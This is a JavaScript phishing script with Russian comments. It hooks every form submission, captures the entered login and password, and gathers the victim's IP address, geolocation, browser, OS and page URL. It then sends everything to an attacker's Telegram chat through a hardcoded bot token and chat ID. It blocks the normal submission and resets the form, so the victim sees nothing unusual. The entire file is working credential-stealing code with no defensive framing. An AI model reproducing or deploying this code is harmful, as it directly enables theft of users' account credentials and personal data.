const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

// Функция отправки сообщения в Telegram
let lastSendTime = 0;
function sendToTelegram(message) {
    const now = Date.now();
    const delay = Math.max(0, 1000 - (now - lastSendTime)); // Минимум 1 секунда между запросами

    return new Promise(resolve => {
        setTimeout(() => {
            const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
            })
                .catch(err => console.error("Ошибка отправки в Telegram:", err))
                .finally(() => resolve());

            lastSendTime = Date.now();
        }, delay);
    });
}

// Функция хэширования домена
async function hashDomain(domain) {
    try {
        const buffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain));
        const hashArray = Array.from(new Uint8Array(buffer));
        const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
        return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
    } catch (err) {
        console.error("Ошибка хэширования домена:", err);
        return "#error";
    }
}

// Функция получения информации о IP
function getIPInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => {
            if (!response.ok) throw new Error("Ошибка получения информации о IP");
            return response.json();
        })
        .then(data => ({
            ip: data.ip,
            location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
            org: window.location.hostname,
        }))
        .catch(err => {
            console.error("Ошибка получения информации о IP:", err);
            return {
                ip: "Неизвестно",
                location: "Неизвестно",
                org: "Неизвестно",
            };
        });
}

// Функция упрощенного анализа User-Agent
function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "Неизвестно";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Неизвестно"];
    const browser = browserMatches[0].split("/")[0]; // Название браузера
    const os = osMatches[1].split(";")[0]; // Операционная система
    return `${browser} on ${os}`;
}

// Асинхронный обработчик события submit
async function handleSubmit(event) {
    event.preventDefault(); // Предотвращение стандартной отправки формы

    const formData = new FormData(event.target);
    const login = formData.get("user") || "Не указано";
    const password = formData.get("passwd") || "Не указано";
    const simplifiedUserAgent = getSimplifiedUserAgent();

    try {
        const info = await getIPInfo();
        const domainHashTag = await hashDomain(info.org);

        const message = `🚀 *Новая отправка формы:*
---
- 🛡️ **Логин:**
\`\`\`
${login}
\`\`\`
- 🛡️ **Пароль:**
\`\`\`
${password}
\`\`\`
- 🌐 **IP-адрес:** ${info.ip}
- 📍 **Местоположение:** ${info.location}
- 🖥️ **User-Agent:** ${simplifiedUserAgent}
- 🔗 **Страница:** ${window.location.href}
- 🏢 **Организация:** ${info.org}
${domainHashTag}`;

        console.log("Сообщение для Telegram готово:", message);
        await sendToTelegram(message); // Отправка сообщения в Telegram
    } catch (err) {
        console.error("Ошибка обработки данных:", err);
    } finally {
        console.log("Завершение обработки формы.");
        event.target.reset(); // Сброс формы после обработки
    }
}

// Добавление обработчика события submit
document.addEventListener("submit", handleSubmit);
